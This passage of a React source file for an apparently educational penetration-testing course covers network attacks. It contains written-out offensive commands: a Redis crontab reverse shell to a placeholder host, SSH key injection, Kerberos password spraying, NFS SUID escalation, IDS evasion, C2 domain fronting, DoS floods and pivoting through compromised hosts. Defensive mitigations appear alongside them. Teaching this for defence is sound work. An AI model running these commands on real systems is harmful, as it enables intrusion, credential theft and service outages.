redis-cli -h TARGET_IP CONFIG SET dir "/root/.ssh"
redis-cli -h TARGET_IP CONFIG SET dbfilename "authorized_keys"
redis-cli -h TARGET_IP SET payload "\n\nSSH_PUB_KEY_HERE\n\n"
redis-cli -h TARGET_IP BGSAVE
# Now SSH as root: ssh -i id_rsa root@TARGET_IP

# TECHNIQUE 2: Write crontab:
redis-cli -h TARGET_IP CONFIG SET dir "/var/spool/cron/"
redis-cli -h TARGET_IP CONFIG SET dbfilename "root"
redis-cli -h TARGET_IP SET cron "\n\n* * * * * bash -i >& /dev/tcp/YOUR_IP/PORT_NUM 0>&1\n\n"
redis-cli -h TARGET_IP BGSAVE

# TECHNIQUE 3: Load malicious module (Redis 4+):
# Compile RedisModules-ExecuteCommand, host on HTTP server:
redis-cli -h TARGET_IP MODULE LOAD /path/to/module.so
redis-cli -h TARGET_IP system.exec "id"`}</Pre>

        <H>Kerberos Network Attacks</H>
        <Pre label="// KERBRUTE AND AS-REQ ATTACKS">{`KERBRUTE - Kerberos brute force and user enumeration:
  Works by sending AS-REQ (Authentication Service Request)
  Username enumeration: valid user -> different error code
  No lockout on some configurations (depends on policy)

  # Install:
  go install github.com/ropnop/kerbrute@latest

  # User enumeration (no creds needed):
  kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL users.txt

  # Password spray (one password, many users - avoid lockout):
  kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL users.txt "Password1"

  # Brute force (single user):
  kerbrute bruteuser --dc DC_IP -d DOMAIN.LOCAL passwords.txt admin

AS-REP ROASTING (no pre-auth required accounts):
  Some AD accounts have "Do not require Kerberos preauthentication"
  AS-REQ for these accounts returns encrypted TGT without auth
  Crack the encrypted TGT offline

  # impacket:
  impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile users.txt -dc-ip DC_IP -no-pass

  # hashcat crack (mode 18200 = Kerberos 5 AS-REP):
  hashcat -m 18200 asrep_hashes.txt rockyou.txt

KDC ENUMERATION:
  nmap -p 88 --open 192.168.1.0/24   # find domain controllers
  nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=DOMAIN.LOCAL TARGET_IP`}</Pre>

        <H>NFS and Memcached Attacks</H>
        <Pre label="// NFS SHARE MOUNTING AND MEMCACHED AMPLIFICATION">{`NFS ATTACKS:
  # Discover NFS shares:
  showmount -e TARGET_IP
  nmap -sV --script nfs-showmount TARGET_IP
  nmap --script nfs-ls,nfs-statfs TARGET_IP

  # Mount exposed share:
  sudo mount -t nfs TARGET_IP:/share /mnt/nfs
  ls -la /mnt/nfs

  # Root squash bypass:
  # root_squash: root on client = nobody on server (default)
  # no_root_squash: root on client = root on server (vulnerable)
  # If no_root_squash: create SUID binary on share, execute from target
  sudo cp /bin/bash /mnt/nfs/
  sudo chmod +s /mnt/nfs/bash
  # On target (after NFS access): /path/to/bash -p -> root

MEMCACHED UDP AMPLIFICATION:
  Memcached on UDP 11211 (default)
  Request 15 bytes -> response up to 750 KB (51000x amplification!)
  Used in 2018 GitHub DDoS (1.35 Tbps)

  # Detect exposed Memcached:
  nmap -sU -p 11211 TARGET_IP
  echo -e "stats\r" | nc -u TARGET_IP 11211

  # Mitigation: never expose Memcached on internet
  # Bind to localhost: -l 127.0.0.1
  # Disable UDP: -U 0`}</Pre>
      </div>
    ),
    takeaways: [
      'Responder passively captures NTLMv2 hashes from LLMNR/NBT-NS broadcasts - any Windows machine that fails to resolve a hostname broadcasts on the local network',
      'NTLM relay is more powerful than hash cracking because it authenticates in real time - disable SMB signing company-wide and every Windows machine becomes a relay target',
      'DNS tunneling works because DNS is almost never blocked - dnscat2 and iodine provide full bidirectional tunnels entirely over DNS queries',
      'Redis without authentication combined with CONFIG SET allows writing arbitrary files to disk - leads to SSH key injection or cron-based RCE without any exploit code',
      'Kerbrute user enumeration generates no account lockouts on default configurations - valid usernames return different Kerberos error codes than invalid ones'
    ]
  },

  {
    id: 'ch6-evasion',
    title: 'Firewall and IDS Evasion',
    difficulty: 'ADVANCED',
    readTime: '14 min',
    content: (
      <div>
        <P>Detection is the enemy of a successful engagement. Firewalls block traffic by rules. IDS/IPS detect known attack patterns. This chapter covers how to understand defensive systems deeply enough to route around them.</P>

        <H>Firewall Rule Inference</H>
        <Pre label="// DETERMINE FIREWALL RULES WITHOUT SEEING THE CONFIG">{`ACK SCAN (firewall mapping):
  nmap -sA TARGET_IP
  Open/Closed ports: RST returned = UNFILTERED (no firewall rule)
  No response = FILTERED (firewall dropping packets)
  Use to determine which ports have firewall rules vs none

TTL ANALYSIS:
  Firewalls and routers decrement TTL
  Different paths through firewall -> different TTL values
  Compare TTL to open vs filtered ports
  Inconsistent TTL = traffic taking different paths -> inline device

WINDOW SIZE FINGERPRINTING:
  Different OS have different default TCP window sizes
  Linux: 5840 / 29200 / 65535
  Windows: 8192 / 65535
  Use window size to fingerprint OS through firewall

BANNER GRABBING THROUGH FIREWALL:
  nc -w 3 TARGET_IP PORT_NUM
  Some firewalls pass banners even on blocked services
  Banner reveals service version -> known vulnerability research

PORT-BASED FIREWALL BYPASS:
  Firewall allows port 80/443/53 outbound (web/DNS)
  Use those ports for your services
  nmap --source-port 53 TARGET_IP   # appear to be DNS traffic
  nmap --source-port 80 TARGET_IP   # appear to come from web server`}</Pre>

        <H>Fragmentation and MTU Evasion</H>
        <Pre label="// FRAGMENT PACKETS TO BYPASS INSPECTION">{`HOW FRAGMENTATION EVASION WORKS:
  Deep Packet Inspection reassembles fragments before inspecting
  Older/cheaper firewalls do not reassemble -> inspect fragments individually
  Pattern "malware_signature" split across fragments = no match

NMAP FRAGMENTATION:
  nmap -f TARGET_IP            # 8-byte fragments
  nmap -f -f TARGET_IP         # 16-byte fragments
  nmap --mtu 16 TARGET_IP      # custom MTU (must be multiple of 8)
  nmap --mtu 24 TARGET_IP
  nmap --badsum TARGET_IP      # bad checksum (see if IDS alerts on bad checksum)

FRAGMENTATION IN SCAPY:
  from scapy.all import *
  pkt = IP(dst="TARGET_IP", flags="MF")/TCP(dport=80, flags="S")
  frag1 = IP(dst="TARGET_IP", flags="MF", frag=0)/pkt[TCP][:4]
  frag2 = IP(dst="TARGET_IP", frag=1)/pkt[TCP][4:]
  send(frag1)
  send(frag2)

MINIMUM MTU:
  Ethernet: 1500 bytes standard MTU
  PPPoE: 1492 bytes
  Some tunnels reduce MTU further
  Craft packets at exact MTU to stress fragment reassembly`}</Pre>

        <H>Decoy and Idle Scanning</H>
        <Pre label="// HIDE YOUR REAL IP DURING SCANNING">{`DECOY SCANNING:
  nmap -D RND:10 TARGET_IP          # 10 random decoy IPs
  nmap -D 1.2.3.4,5.6.7.8 TARGET_IP # specific decoys
  nmap -D RND:5,ME,RND:3 TARGET_IP  # ME = your real IP mixed in

  All decoy IPs + your real IP appear in target logs
  Makes it hard to determine which is the real scanner
  Use realistic IPs (not bogon/reserved) for believability
  Limitation: nmap still sends from YOUR IP for SYN-ACK responses

IDLE/ZOMBIE SCAN (completely anonymous):
  Requires: idle host with predictable IP ID increment (rare today)

  Step 1: Find idle zombie host:
  nmap -O -v TARGET_ZOMBIE
  # Look for "IP ID Sequence Generation: Incremental"

  Step 2: Run idle scan:
  nmap -sI ZOMBIE_IP:PORT_NUM TARGET_IP

  Mechanism:
  - Your IP: never touches target
  - Probe zombie IP ID before each test
  - Send SYN to target SPOOFED as zombie IP
  - If port OPEN: target sends SYN-ACK to zombie -> zombie sends RST -> ID increments by 2
  - If port CLOSED: target sends RST to zombie -> zombie ignores -> ID increments by 1
  - Compare zombie IP ID before and after = determine port state`}</Pre>

        <H>Timing Evasion and Rate Limiting</H>
        <Pre label="// EVADE RATE-BASED IDS DETECTION">{`RATE-BASED DETECTION:
  IDS rules: "if 100 SYN to different ports in 1 second -> port scan"
  Evade: slow down scan below detection threshold

NMAP TIMING:
  -T0 Paranoid:  1 probe per 5 minutes (extremely slow)
  -T1 Sneaky:    15 second delay between probes
  --scan-delay 5s   Custom 5 second delay between each probe
  --max-rate 1      Maximum 1 packet per second

EXAMPLE - SLOW SCAN UNDER IDS RADAR:
  nmap -sS -T1 --scan-delay 2s -p- TARGET_IP
  # Full port scan taking hours instead of minutes

RANDOM ORDER:
  nmap --randomize-hosts -sS 192.168.1.0/24
  # Shuffle target order to avoid sequential scan signature

DISTRIBUTED SCANNING:
  Coordinate multiple scan sources
  Each source below detection threshold
  Tools: ZMap with multiple nodes, masscan distributed

COMBINE TECHNIQUES:
  nmap -sS -T1 -f -D RND:10 --source-port 53 \
    --data-length 15 -p 22,80,443,445 TARGET_IP`}</Pre>

        <H>Protocol Tunneling for Firewall Bypass</H>
        <Pre label="// TUNNEL TRAFFIC THROUGH ALLOWED PROTOCOLS">{`HTTP TUNNELING (HTTPTunnel):
  Encapsulate any TCP connection inside HTTP GET/POST requests
  Works when only HTTP/HTTPS is allowed outbound

  # httptunnel server (external):
  hts -F localhost:22 80    # forward port 80 to SSH

  # httptunnel client (inside restricted network):
  htc -F 8022 EXTERNAL_IP:80
  ssh -p 8022 localhost     # SSH through HTTP tunnel

ICMP TUNNELING:
  ptunnel - tunnel TCP inside ICMP echo request/reply
  Works when ICMP is allowed but TCP is blocked

  # Server (external):
  sudo ptunnel

  # Client (restricted network):
  sudo ptunnel -p EXTERNAL_IP -lp 8022 -da FINAL_TARGET -dp 22
  ssh localhost -p 8022    # SSH through ICMP tunnel

DNS TUNNELING (covered in Ch5):
  dnscat2, iodine for full TCP-over-DNS

ENCRYPTED C2 OVER HTTPS:
  C2 frameworks (Cobalt Strike, Sliver, Mythic) use HTTPS
  Traffic looks identical to browser HTTPS requests
  CDN fronting: route C2 through legitimate CDN (Cloudflare, AWS)
  Domain fronting: C2 appears to connect to cdn.amazon.com
  Result: firewall sees Amazon connection, not C2 server

COBALT STRIKE MALLEABLE C2:
  Customize HTTP headers, URIs, timing to mimic legitimate apps
  Profile mimicking Google Analytics, jQuery CDN, Microsoft Office
  Makes C2 traffic nearly indistinguishable from legitimate traffic`}</Pre>

        <H>IDS Signature Evasion</H>
        <Pre label="// UNDERSTANDING AND EVADING SNORT/SURICATA RULES">{`SNORT RULE ANATOMY:
  alert tcp any any -> TARGET_IP 80 (
    msg:"SQL Injection Attempt";
    content:"UNION SELECT";
    nocase;
    sid:1000001;
  )

EVASION TECHNIQUES:

1. ENCODING:
   Signature looks for "UNION SELECT"
   URL encode: UNION%20SELECT
   Double encode: UNION%2520SELECT
   Unicode: UNION+SELECT

2. WHITESPACE MANIPULATION:
   UNION     SELECT  (multiple spaces)
   UNION/**/SELECT   (SQL comment as whitespace)
   UNION%0aSELECT    (newline)

3. CASE VARIATION:
   uNiOn SeLeCt
   Most signatures use nocase, but not all

4. FRAGMENTATION:
   Split signature across multiple packets
   "UNION SE" in packet 1, "LECT" in packet 2
   IDS must reassemble to detect (expensive)

5. PROTOCOL ANOMALIES:
   Non-standard HTTP methods (BLAH / HTTP/1.0)
   Chunked encoding to split patterns
   HTTP pipelining
   Large number of headers

6. ENCRYPTED PROTOCOLS:
   HTTPS hides payloads from signature inspection
   Only NGFW with SSL inspection sees contents
   Use HTTPS for all C2 and exfil

7. TIMING:
   Send slow to evade threshold-based rules
   Spread across multiple sessions

METASPLOIT EVASION:
  use evasion/windows/windows_defender_exe
  set FILENAME payload.exe
  generate`}</Pre>
      </div>
    ),
    takeaways: [
      'ACK scan (-sA) does not discover open ports but reveals firewall rules - RST means unfiltered, no response means a firewall is dropping packets',
      'The idle scan is theoretically perfect evasion - your IP never appears in target logs, but finding a suitable zombie host with predictable IP IDs is rare on modern networks',
      'Fragmentation evasion works against stateless firewalls but fails against NGFW with full reassembly - always test which defensive technology is in place first',
      'IDS signature evasion often combines encoding, whitespace, and fragmentation - a single technique rarely bypasses modern IDS, but combinations are effective',
      'Protocol tunneling (DNS, ICMP, HTTP) turns any allowed protocol into an arbitrary bidirectional channel - virtually every network has at least one allowed protocol that can be abused'
    ]
  },

  {
    id: 'ch7-dos',
    title: 'Denial of Service - Understanding and Defense',
    difficulty: 'ADVANCED',
    readTime: '14 min',
    content: (
      <div>
        <Note label="IMPORTANT DISCLAIMER">Denial of Service attacks against unauthorized targets are illegal in virtually every jurisdiction. This chapter covers DoS concepts strictly for defensive understanding - to build effective mitigations you must understand how attacks work. Never conduct DoS testing without explicit written authorization.</Note>

        <P>Denial of Service attacks aim to make a service unavailable to legitimate users. Understanding the anatomy of each attack type is essential for building effective defenses. Security professionals need this knowledge to test their own infrastructure and design mitigations.</P>

        <H>DoS Taxonomy</H>
        <Pre label="// DOS vs DDOS vs DRDOS (AMPLIFICATION)">{`DoS (Denial of Service):
  Single attacker -> single target
  Limited by attacker bandwidth/resources
  Easier to block (single source IP)

DDoS (Distributed Denial of Service):
  Many attackers (botnet) -> single target
  Aggregate bandwidth can be terabits/sec
  Hard to block: thousands of source IPs
  Mitigated by: Cloudflare, AWS Shield, Akamai

DRDoS (Distributed Reflected DoS / Amplification):
  Attacker spoofs source IP as victim's IP
  Sends small requests to many reflectors
  Reflectors send large responses to VICTIM
  Attacker bandwidth stays low, victim gets flooded
  Amplification factor: response_size / request_size

AMPLIFICATION FACTORS (approximate):
  DNS ANY query:     28-54x amplification
  NTP monlist:       556x amplification
  SSDP:              30x amplification
  Memcached UDP:     51000x amplification (!)
  CLDAP:             70x amplification
  CharGEN:           358x amplification`}</Pre>

        <H>Volume-Based Attacks</H>
        <Pre label="// SYN FLOOD, UDP FLOOD, ICMP FLOOD">{`SYN FLOOD:
  Sends millions of TCP SYN packets (often with spoofed IPs)
  Server allocates memory for each half-open connection
  Connection table fills up -> legitimate connections rejected

  # hping3 SYN flood (TESTING YOUR OWN INFRASTRUCTURE ONLY):
  sudo hping3 --flood --syn -p PORT_NUM TARGET_IP
  sudo hping3 --flood --rand-source --syn -p PORT_NUM TARGET_IP

  DEFENSE:
  - SYN cookies (kernel-level, eliminates state until ACK)
  - Rate limiting SYN packets per second
  - iptables: iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
  - Hardware load balancer with SYN proxy

UDP FLOOD:
  Send high volume UDP to random ports
  Server checks for service on port, finds none, sends ICMP unreachable
  High bandwidth consumption on both sides

  sudo hping3 --flood --udp -p PORT_NUM TARGET_IP

  DEFENSE:
  - Rate limit UDP at perimeter
  - UDP is stateless, block all UDP except necessary ports
  - BCP38: ISP-level ingress filtering (prevents spoofed src)

ICMP FLOOD (Ping Flood):
  Overwhelm with ICMP echo requests
  Target wastes cycles generating echo replies

  sudo hping3 --flood -1 TARGET_IP  # -1 = ICMP mode

  SMURF ATTACK (historical, amplification):
  Spoof victim IP, send ICMP to broadcast address
  All hosts on subnet reply to victim
  Amplification = number of hosts on subnet
  Mitigated: no_directed_broadcast (Cisco default since IOS 12.0)`}</Pre>

        <H>Application Layer Attacks</H>
        <Pre label="// LAYER 7 DOS - EXHAUST SERVER RESOURCES">{`SLOWLORIS:
  Opens many HTTP connections, sends headers VERY slowly
  Never completes HTTP request (sends partial headers)
  Server holds connection open waiting for rest of request
  Exhausts server connection pool
  Apache more vulnerable than nginx

  # Test your own server:
  slowloris TARGET_IP -p 80 -s 1000
  # -s = number of sockets

RUDY (R-U-Dead-Yet):
  HTTP POST with extremely large Content-Length
  Sends POST body 1 byte at a time very slowly
  Server waits for complete POST body
  Similar impact to Slowloris but via POST

HTTP FLOOD (CC Attack):
  High volume of legitimate-looking HTTP GET/POST requests
  Bypasses volume-based mitigation (each request is valid)
  Target expensive operations: search, login, reports
  Requires many source IPs to be effective
  Mitigated by: rate limiting per IP, CAPTCHAs, WAF

LAYER 7 RESOURCE EXHAUSTION:
  Find computationally expensive operations:
  - Complex search queries (ReDoS)
  - Large file uploads/processing
  - Report generation
  - Recursive calls (amplification via app logic)
  One attacker with slow connection -> exhaust server CPU`}</Pre>

        <H>DDoS Mitigation Architecture</H>
        <Pre label="// DEFENSE LAYERS FOR DDOS MITIGATION">{`CLOUDFLARE / AKAMAI / AWS SHIELD:
  Anycast routing: traffic absorbed at edge nodes globally
  Scrubbing centers: filter attack traffic, pass clean
  BGP blackholing: drop specific prefixes under attack
  Works at: 100+ Tbps capacity
  RTBH (Remotely Triggered Black Hole):
    BGP community to null-route traffic at upstream ISP
    You stop all traffic to attacked IP (even legitimate)
    Last resort when attack exceeds pipe capacity

ON-PREMISE MITIGATION:
  Rate limiting with iptables:
  # SYN rate limit:
  iptables -A INPUT -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT
  iptables -A INPUT -p tcp --syn -j DROP

  # Connection limit per IP:
  iptables -A INPUT -p tcp --syn -m connlimit --connlimit-above 20 -j DROP

  fail2ban (auto-block abusive IPs):
  # /etc/fail2ban/jail.local:
  [http-dos]
  enabled = true
  filter = http-dos
  action = iptables-allports[name=HTTP-DOS]
  logpath = /var/log/nginx/access.log
  maxretry = 300
  findtime = 60
  bantime = 3600

NGINX RATE LIMITING:
  # /etc/nginx/nginx.conf:
  limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
  limit_conn_zone $binary_remote_addr zone=conn:10m;

  # In server block:
  limit_req zone=api burst=20 nodelay;
  limit_conn conn 10;

ANYCAST FOR DDOS MITIGATION:
  Same IP announced from multiple locations via BGP
  DNS resolves to nearest Anycast node
  DDoS traffic distributed across all Anycast nodes
  No single point absorbs all attack traffic`}</Pre>
      </div>
    ),
    takeaways: [
      'Amplification attacks weaponize legitimate protocols - Memcached UDP amplification achieves 51000x multiplication meaning 1 Gbps attacker can generate 51 Tbps toward victim',
      'Slowloris needs no botnet - a single attacker with low bandwidth can take down Apache by holding hundreds of connections open with incomplete HTTP headers',
      'SYN cookies eliminate the attack surface for SYN floods by encoding connection state in the sequence number - no memory allocated until ACK received',
      'BGP blackholing stops attacks at upstream ISP level but also drops all legitimate traffic to the attacked IP - it is a last resort, not a first response',
      'Rate limiting at every layer (iptables, nginx, application) provides defense in depth - no single rate limiter is sufficient against large-scale application floods'
    ]
  },

  {
    id: 'ch8-pivoting',
    title: 'Network Pivoting and Tunneling',
    difficulty: 'ADVANCED',
    readTime: '16 min',
    labLink: '/modules/network-attacks/lab',
    content: (
      <div>
        <P>Pivoting is the art of using a compromised host as a relay to reach otherwise inaccessible network segments. In segmented environments - which should be all enterprise environments - your initial foothold is rarely your final target. Pivoting bridges network boundaries.</P>

        <Note label="CONCEPT">Think of pivoting like this: you compromise a web server in the DMZ. Behind it is an internal network you cannot reach from the internet. By routing your tools through the compromised web server, you make the internal network appear as if it is directly attached to your attack machine.</Note>

        <H>Ligolo-ng - Modern Agent-Based Tunneling</H>
        <Pre label="// LIGOLO-NG COMPLETE SETUP">{`ARCHITECTURE:
  Attack box runs: ./proxy (the server, creates TUN interface)
  Compromised host runs: ./agent (connects outbound to proxy)
  Creates a real TUN interface on attack box
  Route internal subnets through TUN -> tools work natively

SETUP ON ATTACK BOX:
  # Download from: https://github.com/nicocha30/ligolo-ng/releases

  # Create TUN interface:
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up

  # Start proxy server (self-signed cert):
  ./proxy -selfcert
  # Proxy listens on 0.0.0.0:11601

DEPLOY AGENT ON COMPROMISED HOST:
  # Transfer agent binary to target
  # Windows:
  agent.exe -connect ATTACK_IP:11601 -ignore-cert
  # Linux:
  ./agent -connect ATTACK_IP:11601 -ignore-cert

IN LIGOLO-NG PROXY CONSOLE:
  session          # list connected agents
  1                # select session 1
  ifconfig         # show agent network interfaces
  start            # start tunnel

ADD ROUTES ON ATTACK BOX:
  # Internal subnet visible from agent (e.g. 10.10.20.0/24):
  sudo ip route add 10.10.20.0/24 dev ligolo

  # Now scan internal network directly:
  nmap -sV 10.10.20.0/24
  crackmapexec smb 10.10.20.0/24

DOUBLE PIVOT (second hop):
  # On second compromised host in network B:
  ./agent -connect PIVOT1_IP:11601 -ignore-cert
  # Add routes for network C:
  sudo ip route add 10.10.30.0/24 dev ligolo`}</Pre>

        <H>Chisel - HTTP Tunnel</H>
        <Pre label="// CHISEL CLIENT-SERVER SETUP">{`ARCHITECTURE:
  Chisel tunnels TCP/UDP over HTTP/HTTPS
  Works through HTTP proxies (common in enterprise)
  Server on attack box, client on compromised host

INSTALL:
  # Go binary, available for Linux/Windows/Mac:
  # https://github.com/jpillora/chisel/releases

SETUP - SOCKS5 PROXY MODE (most useful):
  # Attack box (server):
  ./chisel server --port 8080 --reverse --socks5
  # --reverse allows clients to expose their network

  # Compromised host (client):
  ./chisel client ATTACK_IP:8080 R:socks
  # Creates reverse SOCKS5 proxy on attack box port 1080

  # Use with proxychains:
  # /etc/proxychains4.conf: socks5 127.0.0.1 1080
  proxychains nmap -sT -Pn -p 22,80,443 INTERNAL_IP

SETUP - SPECIFIC PORT FORWARD:
  # Attack box:
  ./chisel server --port 8080 --reverse

  # Compromised host:
  ./chisel client ATTACK_IP:8080 R:LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT
  # Example: expose internal RDP
  ./chisel client ATTACK_IP:8080 R:3389:10.10.10.5:3389

  # Now connect from attack box:
  xfreerdp /v:localhost:3389 /u:admin

OVER HTTPS (evade detection):
  ./chisel server --port 443 --reverse --tls-key key.pem --tls-cert cert.pem`}</Pre>

        <H>Metasploit Routing and Pivoting</H>
        <Pre label="// METASPLOIT ROUTE AND AUTOROUTE">{`ROUTE VIA SESSION:
  # After getting Meterpreter shell on pivot host:
  background          # background session (e.g. session 1)

  # Add route to internal network through session 1:
  route add 10.10.20.0/24 1    # session 1 as gateway

  # Or use auxiliary:
  use post/multi/manage/autoroute
  set SESSION 1
  set SUBNET 10.10.20.0
  set NETMASK 255.255.255.0
  run

  # Now all Metasploit modules reach internal network:
  use auxiliary/scanner/smb/smb_ms17_010
  set RHOSTS 10.10.20.0/24
  run

SOCKS PROXY VIA METASPLOIT:
  use auxiliary/server/socks_proxy
  set SRVPORT 1080
  set VERSION 5
  run

  # Then use proxychains with external tools:
  proxychains crackmapexec smb 10.10.20.0/24

PORTFWD (port forward in Meterpreter):
  meterpreter > portfwd add -l LOCAL_PORT -p REMOTE_PORT -r INTERNAL_IP
  # Example: access internal RDP:
  portfwd add -l 3389 -p 3389 -r 10.10.20.5
  xfreerdp /v:localhost:3389 /u:administrator`}</Pre>

        <H>sshuttle and rpivot</H>
        <Pre label="// SSHUTTLE VPN-LIKE TUNNEL AND RPIVOT REVERSE SOCKS">{`SSHUTTLE - "Poor man's VPN over SSH":
  Routes entire subnets through SSH
  No root needed on remote end (just Python)
  Transparent to tools - no proxychains needed

  # Install:
  pip install sshuttle

  # Route specific subnet:
  sshuttle -r user@PIVOT_HOST 10.10.20.0/24

  # Route ALL traffic (including DNS):
  sshuttle -r user@PIVOT_HOST 0/0 -v

  # Use private key:
  sshuttle -r user@PIVOT_HOST --ssh-cmd "ssh -i id_rsa" 10.0.0.0/8

  # Exclude SSH server from tunnel (prevent loop):
  sshuttle -r user@PIVOT_HOST 10.0.0.0/8 -x PIVOT_HOST

rpivot - Reverse SOCKS Proxy:
  Useful when target can only make outbound connections
  Client runs on target, server runs on attack box

  # Attack box (server):
  python3 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

  # Compromised host (client):
  python3 client.py --server-ip ATTACK_IP --server-port 9999

  # SOCKS4 proxy now available on attack box port 1080:
  proxychains nmap -sT INTERNAL_IP`}</Pre>

        <H>Proxychains Configuration</H>
        <Pre label="// PROXYCHAINS4 SETUP AND CHAINING">{`INSTALL:
  sudo apt install proxychains4

CONFIGURE (/etc/proxychains4.conf):
  # Uncomment for SOCKS5 via ligolo/chisel:
  socks5 127.0.0.1 1080

  # Or SOCKS4 (older tools):
  socks4 127.0.0.1 1080

  # Chain multiple proxies (double pivot):
  socks5 127.0.0.1 1080    # first pivot
  socks5 127.0.0.1 1081    # second pivot

PROXY MODES:
  dynamic_chain  - use proxies in order, skip dead ones
  strict_chain   - all proxies must be up (ordered)
  round_robin    - cycle through list
  random_chain   - randomize (with chain_len)

USE WITH TOOLS:
  proxychains nmap -sT -Pn -p 22,80,445 INTERNAL_IP
  # Note: -sT required (not -sS), nmap must use TCP connect
  # Note: -Pn required (no ICMP through proxy)

  proxychains crackmapexec smb INTERNAL_IP -u admin -p Password1
  proxychains ssh user@INTERNAL_IP
  proxychains curl http://INTERNAL_IP/
  proxychains python3 exploit.py INTERNAL_IP`}</Pre>

        <H>Double Pivoting</H>
        <Pre label="// CHAINING MULTIPLE PIVOTS THROUGH SEGMENTS">{`SCENARIO:
  Internet -> [Firewall] -> DMZ (10.10.10.0/24)
                            -> [Firewall] -> Internal (172.16.0.0/24)
                                             -> [Firewall] -> Prod DB (192.168.100.0/24)

  You compromise: DMZ_HOST (10.10.10.5) -> INTERNAL_HOST (172.16.0.10)
  Goal: reach Production DB network (192.168.100.0/24)

WITH LIGOLO-NG:
  # Session 1: DMZ_HOST as agent
  # Routes: 172.16.0.0/24 via ligolo
  sudo ip route add 172.16.0.0/24 dev ligolo

  # Compromise INTERNAL_HOST via 172.16.0.10
  # Deploy agent on INTERNAL_HOST (connects via DMZ_HOST)
  # Session 2: INTERNAL_HOST as agent
  # Routes: 192.168.100.0/24 via ligolo
  sudo ip route add 192.168.100.0/24 dev ligolo

  # Now reach Prod DB directly from attack box:
  nmap -sT 192.168.100.0/24

WITH SSH CHAINS:
  # First hop: attack box -> DMZ_HOST:
  ssh -D 1080 -N user@DMZ_HOST &

  # Second hop through SOCKS proxy:
  # ProxyCommand in ssh config:
  # Host 172.16.0.10
  #   ProxyCommand nc -x 127.0.0.1:1080 %h %p
  ssh -D 1081 -N user@172.16.0.10

  # proxychains4.conf:
  # socks5 127.0.0.1 1081
  proxychains nmap -sT 192.168.100.0/24`}</Pre>
      </div>
    ),
    takeaways: [
      'Ligolo-ng creates a real TUN interface on your attack box - tools run natively without proxychains, making it the most transparent pivot solution available',
      'Chisel tunnels over HTTP/HTTPS and works through corporate HTTP proxies - essential when firewalls block non-HTTP outbound traffic',
      'sshuttle requires no root on the remote host and routes entire subnets transparently - it is the simplest VPN-like pivot when SSH access is available',
      'Double pivoting chains multiple compromised hosts to cross multiple network segments - each hop requires establishing a tunnel through the previous one',
      'proxychains forces tools through SOCKS proxies but requires TCP connect mode (not SYN scan) and no ICMP - always use -sT and -Pn with nmap through proxychains'
    ]
  }
]

export default function NetworkAttacksPage() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a7a' }}>
        <Link href="/" style={{ color: '#5a7a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/" style={{ color: '#5a7a7a', textDecoration: 'none' }}>MODULES</Link>
        <span>›</span>
        <span style={{ color: accent }}>MOD-08 // NETWORK ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(0,255,255,0.08)', border: '1px solid rgba(0,255,255,0.3)', borderRadius: '3px', color: accent, fontSize: '8px', fontFamily: 'JetBrains Mono, monospace', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/network-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(0,255,255,0.1)', border: '1px solid rgba(0,255,255,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700, fontFamily: 'JetBrains Mono, monospace' }}>LAB -&gt;</Link>
        </div>
      </div>

      {/* Module header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a7a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · MOD-08 · 8 CHAPTERS · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(0,255,255,0.35)' }}>NETWORK ATTACKS</h1>
        <p style={{ color: '#5a7a7a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', margin: 0 }}>
          TCP/IP internals · Scanning · Wireshark · ARP poisoning · MITM · Protocol attacks · Evasion · DoS · Pivoting
        </p>
      </div>

      {/* Chapter overview stats */}
      <div className="module-stat-grid">
        {[
          ['8', 'CHAPTERS'],
          ['~2.8hr', 'TOTAL READ'],
          ['ADVANCED', 'DIFFICULTY'],
          ['MOD-08', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(0,255,255,0.04)', border: '1px solid rgba(0,255,255,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.6rem', color: '#1a4a4a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      {/* Codex */}
      <ModuleCodex
        moduleId="network-attacks"
        accent={accent}
        chapters={chapters}
      />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #0a2020' }}>
        <div style={{ background: 'rgba(0,255,255,0.04)', border: '1px solid rgba(0,255,255,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#1a4a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
